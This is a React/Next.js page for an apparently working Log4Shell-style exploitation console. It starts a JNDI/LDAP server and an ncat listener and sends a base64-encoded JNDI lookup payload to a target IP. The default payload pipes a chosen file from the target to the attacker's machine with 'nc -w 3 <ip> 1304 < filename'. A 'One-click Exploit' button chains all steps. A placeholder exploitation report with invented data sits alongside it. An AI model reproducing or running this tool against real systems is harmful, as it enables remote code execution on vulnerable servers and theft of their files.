'use client'
import {
    Box,
    Button,
    Wrap,
    Text,
    Divider,
    Input,
    InputGroup,
    InputRightAddon,
    InputLeftAddon,
    Spinner,
    useColorMode,
    Flex,
    useDisclosure,
    IconButton,
    Modal,
    ModalOverlay,
    ModalContent,
    ModalHeader,
    ModalCloseButton,
    ModalBody,
    ModalFooter,
    Table,
    Thead,
    Tbody,
    Tr,
    Th,
    Td,
} from "@chakra-ui/react";
import { useEffect, useRef, useState } from "react";
import "@fontsource/jetbrains-mono";
import { exportConsole } from "@/app/components/exportconsole";
import {
    fetchJavaPath,
    fetchIP,
    testConnection,
    startJNDI,
    startNcat,
    inputCMD,
    sendPayload,
    stopJNDI,
    stopNcat,
    checkJNDI,
    checkNcat,
} from "@/app/api/fetchdata";
import { InfoOutlineIcon } from "@chakra-ui/icons";
import { createPDF } from "@/app/api/fetchpdf";

const data = {
    "batchNumber": "736628",
    "revision": "0",
    "header_title": "Exploitation Report",
    "os": "Ubuntu 24.04 LTS",
    "hostname": "Target",
    "ip": "192.168.78.100",
    "mac": "ff:ff:ff:ff:ff:ff",
    "cpu": "AMD",
    "ram": "4GB",
    "exploit": "CVE-2021-1234",
    "exploit_type": "Remote Code Execution",
    "exploit_description": "This is a remote code execution exploit that allows an attacker to execute arbitrary code on the target machine.",
    "exploit_date": "2021-01-01",
    "exploit_author": "John Doe",
    "exploit_results": "The exploit was successful and the target machine was compromised.",
    "root_directory": "/",
    "home_directory": "/home/user",
    "temp_directory": "/tmp",
    "all_users": "user1, user2, user3",
    "running_services": "apache2, ssh, mysql",
    "stopped_services": "none",
    "network_interfaces": "eth0, eth1",
    "network_connections": "",
    "open_ports": "22, 80, 443"
}

const HomePage = () => {
    const { colorMode } = useColorMode();
    const [state, setState] = useState({
        javaPath: '',
        error: '',
        intIP: '',
        extIP: '',
        ipError: '',
        consolelog: '',
        targetIP: '',
        command: '',
        loading: false,
        payload: '',
        filename: '',
    });
    const consoleBoxRef = useRef<HTMLDivElement | null>(null);
    const ipRegex = /^(?:[0-9]{1,3}\.){3}(?!0|255)[0-9]{1,3}$/;
    const { isOpen: isOpenInfo, onOpen: onOpenInfo, onClose: onCloseInfo } = useDisclosure();

    useEffect(() => {
        setState((prevState) => ({ ...prevState, loading: true }));
        fetchJavaPath().then(({ javaPath, error }) => {
            if (javaPath) {
                setState((prevState) => ({ ...prevState, javaPath }));
                updateConsoleLog(`Java Path: ${javaPath}`);
            }
            if (error) {
                setState((prevState) => ({ ...prevState, error }));
            }
            fetchIP().then(({ intIP, extIP, ipError }) => {
                if (intIP) {
                    setState((prevState) => ({ ...prevState, intIP }));
                    updateConsoleLog(`Internal IP: ${intIP}`);
                }
                if (extIP) {
                    setState((prevState) => ({ ...prevState, extIP }));
                    updateConsoleLog(`External IP: ${extIP}`);
                }
                if (ipError) {
                    setState((prevState) => ({ ...prevState, ipError }));
                }
                setState((prevState) => ({ ...prevState, loading: false }));
            });
        });
    }, []);

    useEffect(() => {
        if (consoleBoxRef.current) {
            consoleBoxRef.current.scrollTop = consoleBoxRef.current.scrollHeight;
        }
    }, [state.consolelog]);

    const updateConsoleLog = (log: any) => {
        setState((prevState) => ({ ...prevState, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${log}` : log) }));
    };

    const handleInputButtonClick = async (type: any, payload = null) => {
        setState((prevState) => ({ ...prevState, loading: true }));
        let newConsoleLog = '';
        switch (type) {
            case 'testConnection':
                const testConnectionResult = await testConnection(state.targetIP);
                newConsoleLog += testConnectionResult.message ? `${testConnectionResult.message}` : testConnectionResult.error;
                break;
            case 'inputCommand':
                const base64cmd = btoa(state.command);
                const inputCMDResult = await inputCMD(base64cmd);
                newConsoleLog += inputCMDResult.message || inputCMDResult.error;
                break;
            case 'sendPayload':
                if (!ipRegex.test(state.targetIP)) {
                    newConsoleLog += 'Error: Invalid Target IP Address Format';
                } else {
                    const payload = `nc -w 3 ${state.intIP} 1304 < ${state.filename}`;
                    const base64payload = btoa(state.payload ? state.payload : payload);
                    const payloadResult = await sendPayload(base64payload, state.targetIP);
                    newConsoleLog += `Target IP: ${state.targetIP}\nPayload: ${state.payload ? state.payload : payload}\n${payloadResult.message ? `Result: ${payloadResult.message}` : `Error: ${payloadResult.error}`}`;
                }
                break;
            case 'startJNDI':
                const jndiResult = await startJNDI();
                newConsoleLog += jndiResult.error ? jndiResult.error : jndiResult.message;
                break;
            case 'stopJNDI':
                const stopJndiResult = await stopJNDI();
                newConsoleLog += stopJndiResult.error ? stopJndiResult.error : stopJndiResult.message;
                break;
            case 'checkJNDI':
                const checkJndiResult = await checkJNDI();
                newConsoleLog += checkJndiResult.error ? checkJndiResult.error : checkJndiResult.message;
                break;
            case 'startNcat':
                const ncatResult = await startNcat(state.filename);
                newConsoleLog += ncatResult.error ? ncatResult.error : ncatResult.message;
                break;
            case 'stopNcat':
                const stopNcatResult = await stopNcat();
                newConsoleLog += stopNcatResult.error ? stopNcatResult.error : stopNcatResult.message;
                break;
            case 'checkNcat':
                const checkNcatResult = await checkNcat();
                newConsoleLog += checkNcatResult.error ? checkNcatResult.error : checkNcatResult.message;
                break;
            case 'createPDF':
                const pdfResult = await createPDF(data);
                newConsoleLog += pdfResult.error ? pdfResult.error : "Report exported successfully. Redirecting to download...";
                setTimeout(() => {
                    setState((prevState) => ({ ...prevState, loading: false }));
                }, 5000);
                break;
            default:
                newConsoleLog += 'Unknown operation';
                break;
        }
        setState((prevState) => ({ ...prevState, loading: false, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${newConsoleLog}` : newConsoleLog) }));
    };

    return (
        <>
            <Box>
                <Flex direction={{ base: 'column', md: 'row' }} my={4}>
                    <Box border={'lg'} borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} py={4} mr={4} w={{ base: '100%', md: '50%' }}>
                        <Text fontSize='xl' fontWeight='bold' ml={1}>Host related</Text>
                        <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                            <Input
                                pr='4.5rem'
                                placeholder='Command'
                                value={state.command}
                                onChange={(e) => setState((prevState) => ({ ...prevState, command: e.target.value }))}
                            />
                        </InputGroup>
                        <Button size='md' variant='outline' onClick={() => handleInputButtonClick('inputCommand')} mt={2} borderRadius={'md'}>Execute Command</Button>
                        <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                            <InputLeftAddon>nc -l -p 1304 &gt; </InputLeftAddon>
                            <Input
                                pr='4.5rem'
                                placeholder='Filename'
                                value={state.filename}
                                onChange={(e) => setState((prevState) => ({ ...prevState, filename: e.target.value }))}
                            />
                        </InputGroup>
                    </Box>
                    <Box border={'lg'} borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} w={{ base: '100%', md: '50%' }} mt={{ base: 4, md: 0 }}>
                        <Flex alignItems="center" mt={4} ml={1} justifyContent='center'>
                            <Text fontSize="xl" fontWeight="bold" textAlign="center" mr={2}>
                                Actions
                            </Text>
                            <IconButton
                                icon={<InfoOutlineIcon />}
                                aria-label="Info"
                                variant="ghost"
                                isRound
                                size="sm"
                                _hover={{ bg: 'transparent' }}
                                onClick={onOpenInfo}
                            />
                        </Flex>
                        <Wrap spacing={2} mt={4} justify='center'>
                            {[
                                { label: 'Test Connection', type: 'testConnection' },
                                { label: 'Start JNDI', type: 'startJNDI' },
                                { label: 'Stop JNDI', type: 'stopJNDI' },
                                { label: 'Check JNDI', type: 'checkJNDI' },
                                { label: 'Start Ncat', type: 'startNcat' },
                                { label: 'Stop Ncat', type: 'stopNcat' },
                                { label: 'Check Ncat', type: 'checkNcat' },
                                { label: 'Send Payload', type: 'sendPayload' },
                            ].map(({ label, type }) => (
                                <Button isDisabled={state.loading ? true : false} key={type} size={'sm'} colorScheme={type === 'sendPayload' ? 'blue' : type === 'stopJNDI' || type === 'stopNcat' ? 'red' : type === 'startJNDI' || type === 'startNcat' ? 'green' : type === 'exportReport' ? 'purple' : type === 'checkJNDI' || type === 'checkNcat' ? 'cyan' : type === 'testConnection' ? 'green' : 'gray'} variant='outline' onClick={() => handleInputButtonClick(type)}>
                                    {label}
                                </Button>
                            ))}
                        </Wrap>
                        <Wrap spacing={2} my={4} justify='center'>
                            {[
                                {
                                    label: 'One-click Exploit', type: 'exploit',
                                    onClick: async () => {
                                        await handleInputButtonClick('startJNDI');
                                        await handleInputButtonClick('startNcat');
                                        await handleInputButtonClick('sendPayload');
                                    }
                                },
                                { label: 'Export Report', type: 'exportReport', onClick: () => handleInputButtonClick('createPDF') },
                                { label: 'Export Console Log', type: 'exportReport', onClick: () => exportConsole(state.consolelog) },
                                { label: 'Clear All', type: 'clearAll', onClick: () => setState((prevState) => ({ ...prevState, consolelog: '' })) }
                            ].map(({ label, type, onClick }) => (
                                <Button isDisabled={state.loading ? true : false} key={type} onClick={onClick} size={'sm'} colorScheme={type === 'exploit' ? 'teal' : type === 'exportReport' ? 'purple' : 'gray'} variant='outline' style={type === 'exploit' ? { boxShadow: "0 0 5px #0bf4f3, 0 0 5px #0bf4f3 inset", transition: "all 0.3s ease", } : {}} _hover={type === 'exploit' ? { boxShadow: "0 0 10px #0bf4f3, 0 0 20px #0bf4f3, 0 0 20px #fff inset", } : {}}>{label}</Button>
                            ))}
                        </Wrap>
                    </Box>
                </Flex>
                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} py={4} mb={4}>
                    <Text fontSize='xl' fontWeight='bold' ml={1}>Target related</Text>
                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                        <Input
                            pr='4.5rem'
                            placeholder='Target IP Address'
                            value={state.targetIP}
                            onChange={(e) => setState((prevState) => ({ ...prevState, targetIP: e.target.value }))}
                        />
                        <InputRightAddon>:8080</InputRightAddon>
                    </InputGroup>
                    <InputGroup size='md' mt={4} fontFamily={'JetBrains Mono'}>
                        <InputLeftAddon>&#123;jdni:ldap://{state.intIP}:1389/Basic/Command/Base64/</InputLeftAddon>
                        <Input
                            pr='4.5rem'
                            placeholder='nc -w 3 $host 1304 &lt; filename'
                            value={state.payload}
                            onChange={(e) => setState((prevState) => ({ ...prevState, payload: e.target.value }))}
                        />
                        <InputRightAddon>&#125;</InputRightAddon>
                    </InputGroup>
                </Box>
            </Box>
            <Box ref={consoleBoxRef} as="footer" width="full" justifyContent="center" borderWidth='1px' borderRadius='lg' overflow='hidden' minW={"100%"} minH={"40vh"} maxH={"40vh"} overflowY={"auto"}>
                <Box position="sticky" top="0" zIndex="sticky" bg={colorMode === "light" ? "white" : "gray.800"} px={4} pt={4}>
                    <Text ml={1}>Output Console: {state.loading && (<Spinner size='xs' thickness='4px' speed='0.65s' emptyColor='gray.200' color='blue.500' />)}</Text>
                    <Divider my={2} />
                </Box>
                <Box ref={consoleBoxRef} px={4} pb={4}>
                    {state.consolelog.split('\n').map((line, index) => (
                        <Text key={index} fontFamily={'JetBrains Mono'} fontSize={'sm'} whiteSpace='pre-wrap'>
                            {line.split('\n').map((part, i) => (
                                <Text as="span" key={i} display="block"
                                    _before={{
                                        content: '"$ "',
                                        color: 'blue.500',
                                        display: 'inline',
                                        fontFamily: 'JetBrains Mono',
                                        fontWeight: 'bold',
                                        marginRight: '8px',
                                        fontSize: 'sm',
                                    }}
                                >{part}</Text>
                            ))}
                        </Text>
                    ))}
                </Box>
            </Box>
            <Modal isOpen={isOpenInfo} onClose={onCloseInfo} size={'xl'}>
                <ModalOverlay />
                <ModalContent>
                    <ModalHeader>Info</ModalHeader>
                    <ModalCloseButton />
                    <ModalBody>
                        <Table size={'sm'} variant={'simple'}>
                            <Thead>
                                <Tr>
                                    <Th>Action</Th>
                                    <Th>Description</Th>
                                </Tr>
                            </Thead>
                            <Tbody>
                                <Tr>
                                    <Td>Test Connection</Td>
                                    <Td>Test connection to target IP address</Td>
                                </Tr>
                                <Tr>
                                    <Td>Start JNDI</Td>
                                    <Td>Start JNDI server</Td>
                                </Tr>
                                <Tr>
                                    <Td>Stop JNDI</Td>
                                    <Td>Stop JNDI server</Td>
                                </Tr>
                                <Tr>
                                    <Td>Check JNDI</Td>
                                    <Td>Check JNDI server status</Td>
                                </Tr>
                                <Tr>
                                    <Td>Start Ncat</Td>
                                    <Td>Start Ncat server</Td>
                                </Tr>
                                <Tr>
                                    <Td>Stop Ncat</Td>
                                    <Td>Stop Ncat server</Td>
                                </Tr>
                                <Tr>
                                    <Td>Check Ncat</Td>
                                    <Td>Check Ncat server status</Td>
                                </Tr>
                                <Tr>
                                    <Td>Send Payload</Td>
                                    <Td>Send payload to target IP address</Td>
                                </Tr>
                                <Tr>
                                    <Td>One-click Exploit</Td>
                                    <Td>Execute all actions</Td>
                                </Tr>
                                <Tr>
                                    <Td>Export Report</Td>
                                    <Td>Export report to file</Td>
                                </Tr>
                                <Tr>
                                    <Td>Export Console Log</Td>
                                    <Td>Export console log to file</Td>
                                </Tr>
                                <Tr>
                                    <Td>Clear All</Td>
                                    <Td>Clear all console log</Td>
                                </Tr>
                            </Tbody>
                        </Table>
                    </ModalBody>
                    <ModalFooter>
                        <Button colorScheme="blue" mr={3} onClick={onCloseInfo}>
                            Close
                        </Button>
                    </ModalFooter>
                </ModalContent>
            </Modal>
        </>
    );
};

export default HomePage;